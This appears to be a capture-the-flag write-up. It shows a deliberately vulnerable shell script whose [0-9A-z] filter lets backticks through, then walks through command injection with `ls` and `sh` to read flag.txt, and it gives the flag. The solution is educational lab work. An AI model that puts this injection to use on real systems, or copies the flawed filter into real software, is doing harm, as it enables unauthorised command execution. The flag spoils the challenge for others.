# oopsie

## Write-up

- [shell.sh](../shell.sh) :

```sh
#!/bin/sh

MAXLEN=256

exec 2>/dev/null

while echo -n "What's your name? " && read name; do
  name="$(echo -n "${name}" | tr -d '\n\r' | awk '/^[0-9A-z]+$/ { print $0 }')"
  if [ -z "${name}" ]; then
    echo "I don't like your name."
  elif [ "$(echo -n "${name}" | wc -c)" -gt "$MAXLEN" ]; then
    echo "Name too long."
  else
    /bin/sh -c "echo \"Hello, ${name}!\""
  fi
done
```

- Input name is fitered, only characters in range `[0-9A-z]` are allowed

- But in the ASCII range, between `A-Z` and `a-z` there are a few more characters : `` [\]^_` ``

- Since `` ` `` is allowed it can be used to inject commands, for example sending `` `ls` `` returns the output :

```txt
What's your name? `ls`
Hello, bin
dev
flag.txt
lib
lib64
shell.sh
usr!
```

- But since space is disallowed, how can we read the flag using the classic `cat flag.txt` command ?

- Well, we can execute `sh`, right ? But when we pass `` `sh` `` it looks like it's waiting for commands to execute but nothing is printed to the output screen, which is probably due to the fact that `stdout` and `stderr` are not connected to the terminal when performing command substitution using `` `COMMAND` `` (or `$(COMMAND)`)

- But if we think about this a little, since command substitution returns the output of the command after it finishes executing, we can execute `sh`, then inside the newly executed shell, we issue `cat flag.txt`, and then `exit` to exit the shell :

```txt
What's your name? `sh`
cat flag.txt
exit
Hello, shellmates{$MaLL_mi$t4ke_big_con$3qU3ncES}!
```

## Flag

`shellmates{$MaLL_mi$t4ke_big_con$3qU3ncES}`
